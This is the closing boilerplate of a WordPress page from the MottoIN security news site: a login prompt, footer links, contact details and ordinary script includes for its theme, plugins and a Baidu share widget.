                <p>您还未登录，请登录后再进行相关操作！</p>
                <div class="login-btn">
                    <a class="btn btn-login" href="http://www.mottoin.com/login">登 录</a>
                    <a class="btn btn-register" href="http://www.mottoin.com/register">注 册</a>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
<footer class="footer">
    <div class="container">
        <div class="clearfix">
                        <div class="footer-col footer-col-logo">
                <img src="http://www.mottoin.com/img/mottoin/tmxk.png" alt="MottoIN">
            </div>
                        <div class="footer-col footer-col-copy">
                <ul class="footer-nav hidden-xs"><li id="menu-item-104182" class="menu-item menu-item-104182"><a href="http://www.mottoin.com/about">关于我们</a></li>
<li id="menu-item-104181" class="menu-item menu-item-104181"><a href="http://www.mottoin.com/dis">免责声明</a></li>
<li id="menu-item-104183" class="menu-item menu-item-104183"><a href="http://www.mottoin.com/joinus">加入我们</a></li>
<li id="menu-item-105509" class="menu-item menu-item-105509"><a href="http://www.mottoin.com/contact">联系我们</a></li>
<li id="menu-item-104184" class="menu-item menu-item-104184"><a href="http://www.mottoin.com/report">寻求报道</a></li>
<li id="menu-item-104185" class="menu-item menu-item-104185"><a href="http://www.mottoin.com/contribute">我要投稿</a></li>
</ul>                <div class="copyright">
                    Copyright © 2017 MottoIN 版权所有 <a href="http://www.miibeian.gov.cn/">沪ICP备16010654号-5</a>  <img class="alignnone " src="http://www.mottoin.com/img/mottoin/ga.png" width="16" height="16" /> <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402001331">沪公网安备31010402001331号</a>                 </div>
            </div>
            <div class="footer-col footer-col-sns">
                <div class="footer-sns">
                                                                                    <a class="sns-wx" href="javascript:;">
                            <i class="fa fa-weixin"></i>
                            <span style="background-image:url(http://www.mottoin.com/img/mottoin/weixin.jpg);"></span>
                        </a>
                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-weibo"></i></a>
                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-tencent-weibo"></i></a>
                                                                                                                                                                                </div>
            </div>
        </div>
    </div>
</footer>
<div class="action" style="top:50%;">
            <div class="a-box contact">
            <div class="contact-wrap">
                <h3 class="contact-title">联系我们</h3>
                <h4 style="text-align: center;"><span style="color: #2d6ded;"><strong>021-62666911</strong></span></h4>
<p>在线咨询：<a href="http://wpa.qq.com/msgrd?uin=19539638" target="_blank" rel="noopener"><img class="alignnone" title="点击这里给我发消息" src="http://wpa.qq.com/pa?p=2:1666839010:51" alt="点击这里给我发消息" border="0" /></a></p>
<p>邮件：root@mottoin.com</p>
<p>工作时间：周一至周五，9:30-18:30，节假日休息</p>
            </div>
        </div>
                <div class="a-box wechat">
            <div class="wechat-wrap">
                <img src="http://www.mottoin.com/img/mottoin/weixin.jpg" alt="QR code">
            </div>
        </div>
            <div class="a-box gotop" id="j-top" style="display: none;"></div>
</div>
<style>.footer{padding-bottom: 35px;}</style><div id="um_upload_single" style="display:none">
	
</div><div id="um_view_photo" style="display:none">

	<a href="#" data-action="um_remove_modal" class="um-modal-close"><i class="um-faicon-times"></i></a>
	
	<div class="um-modal-body photo">
	
		<div class="um-modal-photo">

		</div>

	</div>
	
</div><script type='text/javascript'>
/* <![CDATA[ */
var _wpcom_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/main.js?ver=2.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/comment-reply.min.js?ver=4.8.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpcom_qa_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","ajaxloading":"http:\/\/www.mottoin.com\/wp-content\/plugins\/wpcom-qa\/images\/loading.gif"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/wpcom-qa/js/scripts.min.js?ver=1.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2b'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var um_scripts = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","fileupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-file-upload.php","imageupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-image-upload.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/um.min.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/pickadate/translations/zh_CN.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/wp-embed.min.js?ver=4.8.1'></script>

		<script type="text/javascript">jQuery( '#request' ).val( '' );</script>

	    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","tsina","weixin","qzone","sqq","douban","fbook","twi","bdhome","tqq","tieba","mail","youdao","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":[{"tag" : "single", "bdSize" : 16}, {"tag" : "global","bdSize" : 16,bdPopupOffsetLeft:-227}],url:'http://www.mottoin.com/wp-content/themes/JustNews'};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://www.mottoin.com/wp-content/themes/JustNews/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
</body>
</html>